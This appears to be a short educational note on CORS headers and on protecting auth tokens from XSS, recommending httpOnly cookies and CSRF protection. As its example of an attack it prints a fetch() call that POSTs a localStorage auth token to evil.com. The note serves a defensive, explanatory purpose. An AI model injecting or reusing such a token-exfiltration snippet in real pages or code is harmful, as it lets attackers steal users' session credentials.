Understanding CORS

What is CORS?
Cross-Origin Resource Sharing is a security mechanism that allows servers to specify which origins can access their resources.

Common CORS Headers:
• Access-Control-Allow-Origin - Which domains can access
• Access-Control-Allow-Methods - Allowed HTTP methods
• Access-Control-Allow-Credentials - Allow cookies/auth

Why it matters:
Without CORS, malicious sites could make requests to APIs using your credentials and steal data.

Understanding the Vulnerability

The Problem:
If an attacker injects malicious JavaScript (XSS), they can execute code like:
fetch('https://evil.com/steal', {
  method: 'POST',
  body: localStorage.getItem('auth_token')
}); The Solution:
• Use httpOnly cookies - JavaScript cannot access them
• Browser sends them automatically with requests
• Even if XSS occurs, tokens can't be stolen
• Combine with CSRF protection for maximum security

Provider Search Implementation:
Supabase handles auth tokens securely, using a combination of approaches to minimize XSS risk while maintaining usability.
